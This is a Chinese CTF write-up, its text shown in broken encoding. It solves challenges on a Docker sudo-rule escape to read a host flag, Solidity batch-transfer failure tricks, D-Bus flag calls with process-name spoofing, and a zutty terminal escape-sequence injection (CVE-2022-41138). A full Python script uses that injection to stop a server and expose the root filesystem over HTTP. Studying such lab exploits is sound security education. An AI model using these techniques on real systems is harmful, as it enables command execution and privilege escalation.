ZModemçœŸç»·ä¸ä½äº†ï¼Œè¿™ä¸œè¥¿ä¹‹å‰æ˜¯èµ°ç”µè¯çº¿çš„ï¼Œé€Ÿåº¦éƒ½ä»¥B/sè®¡çš„ï¼Œæ²¡æƒ³åˆ°åˆèƒ½åœ¨è¿™çœ‹è§å®ƒã€‚

## No Enough Privilege

å¯åŠ¨ç¯å¢ƒã€‚åœ¨æ…¢è…¾è…¾çš„OpenRCå¯åŠ¨ä¹‹åï¼ŒæŸ¥çœ‹æˆ‘ä»¬å¯ä»¥ä½¿ç”¨çš„å‘½ä»¤ã€‚

```
dockerv:~$ sudo -l
User user may run the following commands on dockerv:
    (root) NOPASSWD: /usr/bin/docker run --rm -u 1000\:1000 *, /usr/bin/docker
        image load, !/usr/bin/docker * -u0*, !/usr/bin/docker * -u?0*,
        !/usr/bin/docker * --user?0*, !/usr/bin/docker * -ur*, !/usr/bin/docker
        * -u?r*, !/usr/bin/docker * --user?r*
```

éœ€è¦æˆ‘ä»¬ä»¥å®¹å™¨å†…`1000:1000`ç”¨æˆ·å¯åŠ¨ã€‚æ²¡é™åˆ¶privilegedè‡ªç„¶æ˜¯æå¥½çš„ã€‚è€ƒè™‘åˆ°ZModemçš„é¾Ÿé€Ÿä¸Šä¼ é€Ÿåº¦ï¼Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ªæå…¶è½»é‡åŒ–çš„dockeré•œåƒã€‚è¿™é‡Œä½¿ç”¨alpineï¼Œä¸‹è½½ä¹‹åä¸åˆ°4Mã€‚

```bash
docker pull alpine:latest
docker run -itd --name alpine alpine
docker exec -it alpine /bin/sh
addgroup -g 1000 user
adduser -s /bin/sh -G user user
passwd user
#è¾“å…¥userå¯†ç 
passwd root
#è¾“å…¥rootå¯†ç 
exit
docker container stop alpine
docker commit alpine alpine0
docker save -o /path/to/alpine0.tar alpine0  #ç”Ÿæˆtaræœ‰8M
gzip -9 -k /path/to/alpine0.tar
```

ç„¶åï¼Œè¿™è¾¹å»ºè®®æ‚¨ä½¿ç”¨ ***Arch Linux*** è¿›è¡ŒZModemæ–‡ä»¶ä¸Šä¼ ã€‚åœ¨Windowså†…ç”±äºæœªçŸ¥åŸå› ï¼ŒXshellä¸Šä¼ æ²¡é€Ÿåº¦ã€‚è‹¥æ‚¨æ˜¯Windowsçš„å¿ å®ç”¨æˆ·ï¼Œå®˜æ–¹writeupçš„è¯´æ³•æ˜¯ï¼š

> è‡³äº Windows ç”¨æˆ·ï¼Œæˆ‘ä¹Ÿä¸çŸ¥é“å’‹ä¸Šä¼ ã€‚

åœ¨Archå†…å®‰è£…å¥½`lrzsz`è½¯ä»¶åŒ…åï¼Œåœ¨Konsoleå†…ä½¿ç”¨`stty raw -echo; nc 202.38.93.141 10338; stty sane`è¿æ¥ç¬¬ä¸€å°é¢˜ã€‚è¿æ¥å¥½åï¼Œ

```bash
mkdir /tmp/abc   # Read-only  ä¸€ç”Ÿä¹‹æ•Œ
cd /tmp/abc
rz
```

å³å¯å¯åŠ¨æ–‡ä»¶ä¼ è¾“ã€‚é€‰æ‹©ä½ æ‰“å¥½çš„`alpine0.tar.gz`ï¼Œä¸Šä¼ å®Œæˆå

```bash
gzip -d alpine0.tar.gz
cat alpine0.tar | sudo /usr/bin/docker image load
sudo docker run --rm -u 1000:1000 -it --ipc=host --device=/dev/vdb -v /:/out alpine0
su root
#è¾“å…¥rootå¯†ç 
cat /out/flag
```

å³å¾—flagã€‚

# é“¾ä¸Šè½¬è´¦åŠ©æ‰‹

> Web3å¤§ç¥èƒ½ä¸èƒ½ç»™æˆ‘åˆ·ç‚¹æ¯”ç‰¹å¸

main.pyåœ¨æœ¬åœ°å¼€äº†ä¸ªä»¥å¤ªåŠæµ‹è¯•èŠ‚ç‚¹ï¼Œéƒ¨ç½²æŒ‘æˆ˜åˆåŒå’Œåä¸ªç©å®¶åˆåŒï¼Œå¹¶è°ƒç”¨æŒ‘æˆ˜åˆåŒçš„`batchTransfer`æ–¹æ³•å‘æ‰€æœ‰ç©å®¶åˆåŒæ‰¹é‡è½¬è´¦1ä¸ªETHã€‚æˆ‘ä»¬éœ€è¦è®©ç©å®¶åˆåŒæˆåŠŸéƒ¨ç½²çš„åŒæ—¶é€ æˆè½¬è´¦å¤±è´¥ã€‚

## è½¬è´¦å¤±è´¥

challenge1.solï¼š

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract BatchTransfer {
    function batchTransfer(address payable[] calldata recipients, uint256[] calldata amounts) external payable {
        require(recipients.length == amounts.length, "Recipients and amounts length mismatch");

        uint256 totalAmount = 0;
        uint256 i;

        for (i = 0; i < amounts.length; i++) {
            totalAmount += amounts[i];
        }

        require(totalAmount == msg.value, "Incorrect total amount");

        for (i = 0; i < recipients.length; i++) {
            recipients[i].transfer(amounts[i]);
        }
    }
}

```

ç”±äºåœ¨`recipients[i].transfer(amounts[i]);`ä¸­å‘ç©å®¶åˆçº¦å‘é€ETHæ—¶ï¼Œç©å®¶åˆçº¦éœ€è¦æœ‰receiveå‡½æ•°æ¥æ”¶ã€‚è‹¥æ²¡æœ‰å°±ä¼šå¯¼è‡´è½¬è´¦å¤±è´¥ã€‚

ç›´æ¥æŠŠchallenge1.solç¼–è¯‘ä¸€ä¸‹ä½œä¸ºplayer bytecodeè¿è¡Œå³å¯è½¬è´¦å¤±è´¥ã€‚

## è½¬è´¦åˆå¤±è´¥

challenge2.solï¼š

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract BatchTransfer {
    mapping(address => uint256) public pendingWithdrawals;

    function batchTransfer(address payable[] calldata recipients, uint256[] calldata amounts) external payable {
        require(recipients.length == amounts.length, "Recipients and amounts length mismatch");

        uint256 totalAmount = 0;
        uint256 i;

        for (i = 0; i < amounts.length; i++) {
            totalAmount += amounts[i];
        }

        require(totalAmount == msg.value, "Incorrect total amount");

        for (i = 0; i < recipients.length; i++) {
            (bool success, ) = recipients[i].call{value: amounts[i]}("");
            if (!success) {
                pendingWithdrawals[recipients[i]] += amounts[i];
            }
        }
    }

    function withdrawPending() external {
        uint256 amount = pendingWithdrawals[msg.sender];
        pendingWithdrawals[msg.sender] = 0;
        (bool success, ) = payable(msg.sender).call{value: amount}("");
        require(success, "Withdrawal failed");
    }
}

```

è¿™æ¬¡åŠ å…¥äº†`withdrawPending`å‡½æ•°ï¼Œç”¨äºåœ¨è½¬è´¦å¤±è´¥æ—¶å–å›æœªè½¬è´¦æˆåŠŸçš„ETHï¼Œå¹¶è¿”å›æˆåŠŸã€‚ä½†æ˜¯æ³¨æ„åˆ°ï¼š`(bool success, ) = recipients[i].call{value: amounts[i]}("");`å¹¶æ²¡æœ‰è®¾ç½®gasé™åˆ¶ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦æ¶ˆè€—å¤§é‡gaså³å¯å¯¼è‡´è½¬è´¦å¤±è´¥ã€‚å½“æ—¶ç¼–è¯‘ç”¨çš„åˆçº¦åšchallenge3çš„æ—¶å€™åˆ æ‰äº†ï¼ˆè™½ç„¶ä¹Ÿæ²¡åšå‡ºæ¥ï¼‰ï¼Œå¯ä»¥å‚è€ƒä¸€ä¸‹å®˜æ–¹writeupï¼š

>```
>// SPDX-License-Identifier: MIT
>pragma solidity ^0.8.0;
>
>contract Receiver {
>receive() external payable {
>   while(gasleft() > 100) {}
>}
>}
>```
>
>å¦‚æœæƒ³æ·±å…¥è¿™ä¸€å°é—®çš„ç»†èŠ‚çš„è¯ï¼Œå…¶å®æ™ºèƒ½åˆçº¦åœ¨è°ƒç”¨å¦ä¸€ä¸ªæ™ºèƒ½åˆçº¦çš„æ—¶å€™ï¼Œåªä¼šä¼ é€’å‰©ä½™ gas çš„ 63/64ã€‚æ‰€ä»¥ä¸€æ¬¡è½¬è´¦çš„æ—¶å€™æ¥æ”¶è€…è€—å°½äº† gasï¼Œå¹¶ä¸ä¼šè®©æ‰¹é‡è½¬è´¦åˆçº¦ä¹Ÿç«‹å³å°±è€—å°½ gasã€‚ä½†æ˜¯ï¼Œç”±äºè¿™é¢˜æ˜¯ 10 æ¬¡è½¬è´¦ï¼Œæ¯æ¬¡éƒ½ä¼šæŠŠå‰©ä¸‹çš„ gas ä¼ é€’è¿‡å»ï¼Œè€Œåˆçº¦è°ƒç”¨æœ¬èº«åˆä¼šæ¶ˆè€—ä¸å°‘çš„å›ºå®š gasï¼Œæ‰€ä»¥å¾ˆå¿«å°±ä¼šå¯¼è‡´æ‰¹é‡è½¬è´¦åˆçº¦çš„ gas è€—å°½ã€‚

# ä¸å¤ªåˆ†å¸ƒå¼çš„è½¯æ€»çº¿

## What DBus Gonna Do?

è™½è¯´å¯ä»¥ä¸Šä¼ å¸¦æœ‰shebangçš„è„šæœ¬ï¼Œåˆè™½è¯´Dockerfileé‡Œæœ‰å®‰è£…`dbus-send`ï¼Œä½†æ˜¯æˆ‘åœ¨å†™wpå¤ç°çš„æ—¶å€™å®ƒåˆæ²¡æœ‰äº†ã€‚

```bash
#!/bin/sh

SERVICE="cn.edu.ustc.lug.hack.FlagService"
INTERFACE="cn.edu.ustc.lug.hack.FlagService"
PATH="/cn/edu/ustc/lug/hack/FlagService"
METHOD="GetFlag1"

PARAMETER="Please give me flag1"

FLAG=$(dbus-send --system --print-reply --dest=$SERVICE $PATH $INTERFACE.$METHOD string:$PARAMETER | grep variant | awk '{print $3}')

echo "Flag1: $FLAG"
```

```
stderr (æ ‡å‡†é”™è¯¯ï¼Œå‰ 8192 ä¸ªå­—èŠ‚):
/dev/shm/executable: 13: dbus-send: not found
/dev/shm/executable: 13: grep: not found
/dev/shm/executable: 13: awk: not found
```

è¡Œå§ï¼Œç”¨Cå†™ã€‚

```c
#include <gio/gio.h>
#include <glib.h>
#include <stdio.h>

static void on_get_flag1_completed(GObject *source_object, GAsyncResult *res,
                                  gpointer user_data) {
  GDBusProxy *proxy = G_DBUS_PROXY(source_object);
  GError *error = NULL;
  GVariant *result = NULL;

  result = g_dbus_proxy_call_finish(proxy, res, &error);
  if (error != NULL) {
    g_printerr("Error calling GetFlag1: %s\n", error->message);
    g_error_free(error);
  } else {
    const char *flag;
    g_variant_get(result, "(s)", &flag);
    printf("Received flag1: %s\n", flag);
  }

  if (result != NULL) {
    g_variant_unref(result);
  }
  g_object_unref(proxy);
  g_main_loop_quit((GMainLoop *)user_data);
}

int main() {
  GError *error = NULL;
  GDBusConnection *connection;
  GDBusProxy *proxy;
  GMainLoop *main_loop;

  // è¿æ¥dbus
  connection = g_bus_get_sync(G_BUS_TYPE_SYSTEM, NULL, &error);
  if (error != NULL) {
    g_printerr("Could not connect to system bus: %s\n", error->message);
    g_error_free(error);
    return 1;
  }


  proxy = g_dbus_proxy_new_sync(
      connection, G_DBUS_PROXY_FLAGS_NONE, NULL, 
      "cn.edu.ustc.lug.hack.FlagService",       // Service name
      "/cn/edu/ustc/lug/hack/FlagService",      // Object path
      "cn.edu.ustc.lug.hack.FlagService",       // Interface name
      NULL,                                     
      &error);                                 
  if (error != NULL) {
    g_printerr("Could not create proxy: %s\n", error->message);
    g_error_free(error);
    g_object_unref(connection);
    return 1;
  }

  // ä¸»å¾ªç¯
  main_loop = g_main_loop_new(NULL, FALSE);

  // è°ƒç”¨GetFlag1
  g_dbus_proxy_call(
      proxy, "GetFlag1", g_variant_new("(s)", "Please give me flag1"), // æ–¹æ³•åå’Œå‚æ•°
      G_DBUS_CALL_FLAGS_NONE, -1, NULL, // Flags, è¶…æ—¶ï¼ŒCancellable
      on_get_flag1_completed, main_loop); // å›è°ƒ

  // ä¸»å¾ªç¯
  g_main_loop_run(main_loop);

 
  g_object_unref(proxy);
  g_object_unref(connection);
  g_main_loop_unref(main_loop);

  return 0;
}
```

è¿è¡Œå³å¾—Flagã€‚

## If I Could Be A File Descriptor

å¯¹äºflag2ï¼Œæˆ‘ä»¬éœ€è¦é€šè¿‡æ–‡ä»¶æè¿°ç¬¦å‘DBus Serverä¼ é€’ä¿¡æ¯`Please give me flag2\n`ï¼Œä¸”è¯¥æ–‡ä»¶æè¿°ç¬¦ä¸èƒ½æ˜¯æ–‡ä»¶ç³»ç»Ÿä¸Šçš„å®é™…æ–‡ä»¶ã€‚è¡Œå§ï¼Œç”¨åŒ¿åç®¡é“æˆ–è€…å¥—æ¥å­—å¯¹éƒ½å¯ä»¥ï¼Œè¿™é‡Œç”¨åŒ¿åç®¡é“ã€‚

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <gio/gio.h>
#include <glib.h>
#include <unistd.h>
#include <fcntl.h>

int main(void) {
    GError *error = NULL;
    GDBusConnection *connection;
    GVariant *result;
    GUnixFDList *fd_list;
    int pipe_fds[2];  // [0]: è¯»ç«¯, [1]: å†™ç«¯

    // åˆ›å»ºç®¡é“
    if (pipe(pipe_fds) == -1) {
        perror("pipe");
        exit(EXIT_FAILURE);
    }

    // æ¶ˆæ¯è¿›å†™ç«¯
    const char *message = "Please give me flag2\n";
    write(pipe_fds[1], message, strlen(message));
    close(pipe_fds[1]); // Close the write-end after writing

    // è¿dbus
    connection = g_bus_get_sync(G_BUS_TYPE_SYSTEM, NULL, &error);
    if (error != NULL) {
        g_printerr("Error connecting to system bus: %s\n", error->message);
        g_error_free(error);
        exit(EXIT_FAILURE);
    }

    // å¼€FD listå¸¦å…¥ç®¡é“è¯»ç«¯
    fd_list = g_unix_fd_list_new();
    gint fd_index = g_unix_fd_list_append(fd_list, pipe_fds[0], &error);
    if (error != NULL) {
        g_printerr("Error adding FD to FDList: %s\n", error->message);
        g_error_free(error);
        exit(EXIT_FAILURE);
    }

    // GetFlag2
    result = g_dbus_connection_call_with_unix_fd_list_sync(
        connection,                            
        "cn.edu.ustc.lug.hack.FlagService",    
        "/cn/edu/ustc/lug/hack/FlagService",   
        "cn.edu.ustc.lug.hack.FlagService",   
        "GetFlag2",                            
        g_variant_new("(h)", fd_index),        // æ–‡ä»¶æè¿°ç¬¦
        G_VARIANT_TYPE("(s)"),                 
        G_DBUS_CALL_FLAGS_NONE,                
        -1,                                    
        fd_list,                               // FD list
        NULL,                                  
        NULL,                                  
        &error                                 
    );

    close(pipe_fds[0]);  //å…³è¯»ç«¯

    if (error != NULL) {
        g_printerr("Error calling GetFlag2: %s\n", error->message);
        g_error_free(error);
        exit(EXIT_FAILURE);
    }

    
    if (result) {
        gchar *flag;
        g_variant_get(result, "(s)", &flag);
        g_print("Flag2: %s\n", flag);
        g_variant_unref(result);
    }

    g_clear_object(&connection);
    g_clear_object(&fd_list);

    return 0;
}
```

## Comm Say Maybe

å¯¹äºflag3ï¼Œflagserveré€šè¿‡`GetConnectionUnixProcessID`è·å–ç¨‹åºPIDï¼Œç„¶åè¯»å–`/proc/{pid}/comm`è·å–è°ƒç”¨è€…è¿›ç¨‹åï¼Œè¿›ç¨‹åéœ€è¦ä¸º`getflag3`ã€‚ä½†æ˜¯ä¸Šä¼ åˆ°åˆ¤é¢˜å¹³å°ä¸Šçš„è¿›ç¨‹éƒ½ä¼šè¢«æ”¾åˆ°`/dev/shm/executable`ï¼Œå°±æŒ‰hackergameè¿™ä¹ æ€§è¯´ä¸å®šè¿˜æ˜¯ä¸ªread-onlyã€‚æœç´¢ä¸€ç•ªåï¼Œå‘ç°å¯ä»¥ä½¿ç”¨`prctl`ä¿®æ”¹è¿›ç¨‹åç§°ï¼Œå…¶`PR_SET_NAME`é€‰é¡¹å¯ä»¥è®©æˆ‘ä»¬ä¿®æ”¹çš„è¿›ç¨‹åæ˜¾ç¤ºåœ¨`/proc/{pid}/comm`é‡Œã€‚

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <gio/gio.h>
#include <sys/prctl.h>

int main() {
    // è®¾ç½®è¿›ç¨‹åç§°ä¸º "getflag3"
    if (prctl(PR_SET_NAME, "getflag3", 0, 0, 0) == -1) {
        perror("prctl PR_SET_NAME failed");
        return 1;
    }

    // dbus
    GError *error = NULL;
    GDBusConnection *connection = g_bus_get_sync(G_BUS_TYPE_SYSTEM, NULL, &error);
    if (!connection) {
        g_printerr("Failed to get system bus: %s\n", error->message);
        g_clear_error(&error);
        return 1;
    }

    // getflag3
    GVariant *result = g_dbus_connection_call_sync(
        connection,                                
        "cn.edu.ustc.lug.hack.FlagService",        
        "/cn/edu/ustc/lug/hack/FlagService",       
        "cn.edu.ustc.lug.hack.FlagService",        
        "GetFlag3",                                
        NULL,                                      
        G_VARIANT_TYPE("(s)"),                     
        G_DBUS_CALL_FLAGS_NONE,                    
        -1,                                        
        NULL,                                      
        &error                                     
    );

    if (error) {
        g_printerr("Failed to call GetFlag3: %s\n", error->message);
        g_clear_error(&error);
        g_object_unref(connection);
        return 1;
    }

    // è·å–è¿”å›çš„ flag3 å€¼
    const gchar *flag3;
    g_variant_get(result, "(&s)", &flag3);
    g_print("flag3: %s\n", flag3);

    // æ¸…ç†
    g_variant_unref(result);
    g_object_unref(connection);

    return 0;
}
```

# åŠ¨ç”»åˆ†äº«

> ......äºæ˜¯å°±åªåœ¨è‡ªå·±æœ€å¸¸ä½¿ç”¨çš„ã€**å‡ å¹´å‰ç¼–è¯‘çš„æŸ~~ç¥–ä¼ ~~ç»ˆç«¯æ¨¡æ‹Ÿå™¨**é‡Œé¢è·‘èµ·äº†è‡ªå·±çš„ `fileserver`ï¼Œç„¶åå°±å»é”å±åƒé¥­äº†ã€‚

å“¦ï¼Ÿçœ‹ä¸€ä¸‹Dockerfile:

```dockerfile
FROM ustclug/debian:bullseye AS builder

RUN apt update && apt install -y git build-essential python3-dev pkg-config libfreetype-dev libxmu-dev libgles2-mesa-dev && \
    git clone https://git.hq.sig7.se/zutty.git && cd zutty && git checkout 0.12 && \
    ./waf configure && ./waf
```

å•ç‹¬ç­¾å‡ºä¸€ä¸ªzuttyçš„0.12ç‰ˆæœ¬ã€‚æœ‰ã€æ„æ€ã€‚

https://bugs.gentoo.org/868495ï¼š(CVE-2022-41138) - <x11-terms/zutty-0.13: arbitrary code execution via DECRQSS (like CVE-2008-2383)

æœ‰ã€æ„æ€ã€‚

```
x11-terms/zutty contains a vulnerability which allows arbitrary commands to be run by an attacker who can cause output to be sent to the terminal. Specifically, they can include newlines in an invalid DECRQSS command and Zutty will send those newlines (along with any command included) back to the shell. This vulnerability very closely resembles CVE-2008-2383 in xterm.
```

è¿™ä¸ªæ¼æ´ä¼šè®©DECRQSSåºåˆ—é‡ŒåŒ…å«çš„payloadç›´æ¥è½¬å‘åˆ°ç»ˆç«¯é‡Œï¼ˆæ¨¡æ‹Ÿç”¨æˆ·è¾“å…¥ï¼‰ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå½“å‘ç»ˆç«¯å‘é€`\n`æ—¶ï¼Œæ”»å‡»è€…å¯ä»¥æŠŠä»»æ„å‘½ä»¤æ’å…¥ç»ˆç«¯è¾“å…¥æµå¹¶æ‰§è¡Œã€‚

çœ‹ä¸€ä¸‹fileserverçš„ä»£ç ï¼š

```rust
println!("Received request: {}", request.lines().next().unwrap_or(""));
```

å®ƒä¼šæŠŠï¼ˆå®ƒè®¤ä¸ºçš„ï¼‰HTTPè¯·æ±‚å¤´åœ¨ç»ˆç«¯æ¨¡æ‹Ÿå™¨ä¸­æ‰“å°å‡ºæ¥ã€‚è¿™å°±æœ‰äº†åœ¨ç»ˆç«¯é‡Œæ‰§è¡ŒDECRQSSåºåˆ—å‘½ä»¤æ‰§è¡Œæ¼æ´çš„å¯èƒ½ã€‚

## åªè¦ä¸åœä¸‹ HTTP æœåŠ¡ï¼Œå“åº”å°±ä¼šä¸æ–­å»¶ä¼¸

> å¦‚æœä½ èƒ½è®©å° T çš„ `fileserver` æ— æ³•æ­£å¸¸å“åº”è¯·æ±‚ï¼ˆä¾‹å¦‚è®© `fileserver` é€€å‡ºï¼‰ï¼Œä½ å¯ä»¥è·å¾—ç¬¬ä¸€å°é¢˜çš„ flagã€‚

æˆ‘ä»¬åœ¨ä½¿ç”¨ç»ˆç«¯æ—¶ï¼Œå¦‚æœè¦åœæ­¢ä¸€ä¸ªç¨‹åºè¿è¡Œï¼Œæœ€ç›´æ¥çš„åŠæ³•å°±æ˜¯æŒ‰ä¸‹`Ctrl-C`ã€‚è¿™ä¼šå‘ç»ˆç«¯å‘é€`\x03`ã€‚

> In both [ASCII](https://en.wikipedia.org/wiki/ASCII) and [EBCDIC](https://en.wikipedia.org/wiki/EBCDIC), ETX is [code point](https://en.wikipedia.org/wiki/Code_point) 0x03, often displayed as ^C, and a (ASCII) terminal can send it by typing Ctrl+C.
>
> â€”â€”Wikipedia

æ•…åªéœ€æ¨¡æ‹ŸCtrl-Cè¾“å…¥å³å¯åœæ­¢æ–‡ä»¶æœåŠ¡å™¨ã€‚payload: `\x1bP$q\x03\x1b\\\n`æ‰“8000ç«¯å£å³å¯ã€‚

## å¸Œæœ›çš„ç»ˆç«¯æ¨¡æ‹Ÿå™¨ï¼Œè¿æ¥ç€æˆ‘ä»¬çš„ç¾ç»Š

ç°åœ¨å¯ä»¥åœæ­¢æœåŠ¡å™¨äº†ï¼Œæˆ‘ä»¬è¿˜éœ€è¦æ‰§è¡Œä»£ç ï¼Œè¾“å‡º`/flag2`çš„å†…å®¹ã€‚ç”±äºzuttyçš„stdoutè¢«å†™å…¥/dev/nullï¼Œæˆ‘ä»¬éœ€è¦é€šè¿‡è¿è¡Œçš„æ–‡ä»¶è·å–flagã€‚å¯ä»¥åˆ©ç”¨å·²åœ¨rootæƒé™çš„zuttyå†å¼€ä¸€ä¸ªhttpæœåŠ¡ï¼Œæˆ–è€…åƒå®˜æ–¹wpé‚£æ ·å¤åˆ¶å‡ºæ¥åä½¿ç”¨é™æƒexeè¯»å–ã€‚

æ‰§è¡Œä»»æ„ä»£ç çš„payloadå¦‚ä¸‹ï¼š`\x1bP$q\n some-command \x1b\\\n`

ä½†æ˜¯æœ‰ä¸€ä¸ªé—®é¢˜ã€‚

```rust
println!("Received request: {}", request.lines().next().unwrap_or(""));
```

fileserveråªä¼šå‘zuttyè¾“å‡ºç¬¬ä¸€è¡Œå†…å®¹ï¼ˆ`.lines().next()`ï¼‰ï¼Œpayloadåˆ°`\n`å°±æˆªæ–­äº†ã€‚å®˜æ–¹writeupç»™å‡ºçš„æ–¹æ¡ˆæ˜¯...ä½¿ç”¨`\r`ã€‚å˜›ï¼Œä¸€èˆ¬å†™ä»£ç éƒ½æ˜¯`\n`çš„å§ï¼Œè¿™ä¸ªæœ‰è°ä¼šè®°å¾—......

ä½†æ˜¯ï¼Œå†çœ‹ä¸€ä¸‹ï¼Œè¦æ„æˆä¸€ä¸ªå®Œæ•´çš„DECRQSSåºåˆ—æ˜¯éœ€è¦`\x1b\\`ç»“å°¾çš„ï¼Œåªé ä¸€ä¸ª`\n`ä½œä¸äº†ç»“å°¾ã€‚å› æ­¤å³ä½¿payloadä¼šè¢«éš”æ–­ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡å¤šæ¬¡å‘é€ã€å¤šæ¬¡æ‰“å°æ—¥å¿—çš„æ–¹å¼ä¼ è¾“payloadï¼Œä¼ è¾“å®Œæ•´åå†å‘é€ç»“å°¾ã€‚

```python
sendReq(b'\x1bP$q\x03\n')  # è¿™ç›¸å½“äºåœ¨zuttyå†…æ¨¡æ‹Ÿç”¨æˆ·è¾“å…¥ï¼Œæˆ‘ä»¬éœ€è¦å…ˆåœæ‰fileserverå†å‘shellå‘é€å‘½ä»¤
command = f' || (python3 -m http.server {http_port} -d / )\n'.encode()  
sendReq(command)  # ç”±äºå‘é€æ—¶fileserverçš„æ—¥å¿—è¾“å‡ºæ˜¯"Received request: ..."ï¼Œå› æ­¤éœ€è¦ç”¨||è®©åé¢çš„æŒ‡ä»¤å§‹ç»ˆæ‰§è¡Œ
sendReq(b'\x1b\\\n')
```

å‘é€åå³å¯å¯åŠ¨httpæœåŠ¡ï¼Œè®¿é—®`/flag2`å³å¾—flagã€‚

![](images/672f9b24d29ded1a8cc9761e.png)

å®Œæ•´ç¨‹åºï¼š

```python
#!/usr/bin/env python3

import socket
import time

def sendReq(payload, host="127.0.0.1", port=8000, timeout=2.0):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(timeout)
            sock.connect((host, port))
            sock.sendall(payload)
            return sock.recv(8192).decode()
    except Exception as e:
        return f"Error: {e}"

def main(http_port=7999):
    try:
        # Send the initial payload to start the HTTP server
        sendReq(b'\x1bP$q\x03\n')
        
        # Send the command to start the HTTP server
        command = f' || (python3 -m http.server {http_port} -d / )\n'.encode()
        sendReq(command)
        # Send the ending payload
        sendReq(b'\x1b\\\n')
        
        # Wait for the HTTP server to start
        time.sleep(2)
        
        # Send a GET request to the HTTP server
        get_request = f'GET /flag2 HTTP/1.1\r\nConnection: close\r\n\r\n'.encode()
        response = sendReq(get_request, port=http_port)
        print(response)
        
    except Exception as e:
        print(f"æ‰§è¡Œè¿‡ç¨‹å‡ºé”™: {e}")

if __name__ == "__main__":
    main()

```

## æ²Ÿæ§½çš„å›è½¦è¿˜åœ¨è¿½æˆ‘

å®˜æ–¹writeupï¼š

> æ¯”èµ›çš„æ—¶å€™æ”¶åˆ°äº†ä¸€å°é‚®ä»¶å’¨è¯¢ä¸ºä»€ä¹ˆä¸Šä¼ çš„ Python è„šæœ¬ä¼š executable not foundã€‚çœ‹å½•å±æ–‡ä»¶å‘ç°æ˜¯å› ä¸ºæ–‡ä»¶æ˜¯ CRLF çš„ï¼Œç„¶å shebang å®é™…ä¸Šå°±å˜æˆäº†ï¼š
>
> ```
> #!/usr/bin/python\r
> ```
>
> 
>
> è€Œ `python\r` è¿™ä¸ªæ–‡ä»¶æ˜¯ä¸å­˜åœ¨çš„ã€‚ä½†æ˜¯åˆä¸èƒ½ç»™æç¤ºï¼Œæ‰€ä»¥å¾ˆé—æ†¾ã€‚

æœ€å¥½è¿˜æ˜¯ä½¿ç”¨å’Œé¢˜ç›®ç¯å¢ƒä¸€è‡´çš„è§£é¢˜ç¯å¢ƒï¼Œå¦åˆ™çœŸçš„ä¼šæœ‰å„ç§ç„å­¦é—®é¢˜ã€‚Dockeré¢˜ç”¨Windows Xshellè¿é™¤äº†ZModemæ²¡é€Ÿåº¦å¤–ï¼Œè¿˜æœ‰ç»ˆç«¯å†…è«åå…¶å¦™å‡ºç°çš„å„è‡ªå­—ç¬¦ã€‚ä½¿ç”¨Linuxè¿æ¥åˆ™æ­£å¸¸ã€‚

# å…³ç¯

> 3Dç‰ˆæœ¬çš„å…³ç¯æ¸¸æˆã€‚

> æœ¬é¢˜ç”±å„è‰²ç¡…åŸºç”Ÿå‘½å‹æƒ…ååŠ©ã€‚

åœ¨å…³ç¯æ¸¸æˆä¸­ï¼Œæ¯æŒ‰ä¸‹ä¸€ä¸ªå¼€å…³éƒ½ä¼šå°†è¢«å½±å“çš„ç¯æ³¡çŠ¶æ€å–åï¼Œå†æŒ‰ä¸€æ¬¡åˆä¼šæ¢å¤ï¼ˆå¯é€†æ€§ï¼‰ï¼›ç¯çš„çŠ¶æ€å’Œå¼€å…³æ“ä½œï¼ˆæ˜¯å¦æŒ‰ä¸‹ï¼‰éƒ½åªæœ‰0/1ä¸¤ç§çŠ¶æ€ï¼Œæ‰€æœ‰è¿ç®—éƒ½åœ¨äºŒè¿›åˆ¶åŸŸä¸­è¿›è¡Œï¼Œæ‰€æœ‰åŠ æ³•å‡æ³•ç­‰ä»·äºå¼‚æˆ–è¿ç®—ï¼ˆçº¿æ€§ï¼‰ï¼›å†åŠ ä¸Šç‹¬ç«‹æ€§ã€ç¡®å®šæ€§ç­‰å‰æï¼Œå‰ä¸‰é—®å¯ä½¿ç”¨çº¿æ€§ä»£æ•°ç»™å‡ºé€šè§£ã€‚

## Easy & Medium & Hard

ä¸€ä¸ªå¯ä»¥å¯¹éš¾åº¦1-3è‡ªåŠ¨å‡ºé¢˜ã€è‡ªåŠ¨è§£é¢˜ã€è‡ªåŠ¨åˆ¤é¢˜çš„ç¨‹åºå¦‚ä¸‹ã€‚ä»£ç ä¸­å·²ç»™å‡ºè¾ƒè¯¦ç»†æ³¨é‡Šã€‚

```python
import numpy as np
from Crypto.Random import get_random_bytes

# å®šä¹‰ä¸€ä¸ªå‡½æ•°ï¼Œç”¨äºæ ¹æ®å¼€å…³æ•°ç»„è®¡ç®—ç¯çš„çŠ¶æ€æ•°ç»„
def convert_switch_array_to_lights_array(switch_array: np.array) -> np.array:
    # åˆå§‹åŒ–ç¯çš„çŠ¶æ€æ•°ç»„ï¼Œä¸å¼€å…³æ•°ç»„å½¢çŠ¶ç›¸åŒ
    lights_array = np.zeros_like(switch_array)
    
    # è®¡ç®—æ¯ä¸ªç¯çš„çŠ¶æ€
    lights_array ^= switch_array  # å½“å‰å¼€å…³ç›´æ¥å½±å“å½“å‰ç¯
    lights_array[:-1, :, :] ^= switch_array[1:, :, :]  # ä¸Šæ–¹å¼€å…³å½±å“ä¸‹æ–¹ç¯
    lights_array[1:, :, :] ^= switch_array[:-1, :, :]  # ä¸‹æ–¹å¼€å…³å½±å“ä¸Šæ–¹ç¯
    lights_array[:, :-1, :] ^= switch_array[:, 1:, :]  # å·¦ä¾§å¼€å…³å½±å“å³ä¾§ç¯
    lights_array[:, 1:, :] ^= switch_array[:, :-1, :]  # å³ä¾§å¼€å…³å½±å“å·¦ä¾§ç¯
    lights_array[:, :, :-1] ^= switch_array[:, :, 1:]  # å‰æ–¹å¼€å…³å½±å“åæ–¹ç¯
    lights_array[:, :, 1:] ^= switch_array[:, :, :-1]  # åæ–¹å¼€å…³å½±å“å‰æ–¹ç¯
    
    return lights_array

